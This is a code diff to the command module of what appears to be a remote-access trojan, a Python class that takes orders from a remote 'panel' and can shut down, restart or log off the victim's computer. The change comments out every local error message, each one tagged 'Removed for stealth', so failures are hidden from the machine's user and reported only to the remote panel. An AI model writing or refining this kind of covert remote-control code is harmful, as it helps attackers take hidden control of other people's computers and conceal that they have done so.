@@ -3,7 +3,7 @@ from HTTPSocket import HTTPSocket
 
 class ComputerCMD:
     def __init__(self, panelURL, machineID):
-        self.C = HTTPSocket(str(panelURL), str(machineID))   # Initiate HTTPSocket Class
+        self.C = HTTPSocket(panelURL, machineID)   # Initiate HTTPSocket Class
         self.tempdir = tempfile.gettempdir()      
                     
     def shutdown(self):
@@ -17,8 +17,8 @@ class ComputerCMD:
             os.system(cmd)
         except Exception as e:
             self.C.Send("CleanCommands")  
-            print("[Error In ComputerCMD, shutdown() Function]")
-            print(f"[Error] : {e}")        
+            # print("[Error In ComputerCMD, shutdown() Function]") # Removed for stealth
+            # print(f"[Error] : {e}") # Removed for stealth      
             self.C.Log("Fail", "An unexpected error occurred " + str(e)) 
       
     def restart(self):
@@ -32,8 +32,8 @@ class ComputerCMD:
             os.system(cmd)
         except Exception as e:
             self.C.Send("CleanCommands")  
-            print("[Error In ComputerCMD, restart() Function]")            
-            print(f"[Error] : {e}")        
+            # print("[Error In ComputerCMD, restart() Function]") # Removed for stealth         
+            # print(f"[Error] : {e}") # Removed for stealth      
             self.C.Log("Fail", "An unexpected error occurred " + str(e)) 
 
     def logoff(self):
@@ -47,7 +47,6 @@ class ComputerCMD:
             os.system(cmd)
         except Exception as e:
             self.C.Send("CleanCommands")         
-            print("[Error In ComputerCMD, logoff() Function]")            
-            print(f"[Error] : {e}")        
-            self.C.Log("Fail", "An unexpected error occurred " + str(e))           
-  
+            # print("[Error In ComputerCMD, logoff() Function]") # Removed for stealth         
+            # print(f"[Error] : {e}") # Removed for stealth     
+            self.C.Log("Fail", "An unexpected error occurred " + str(e))
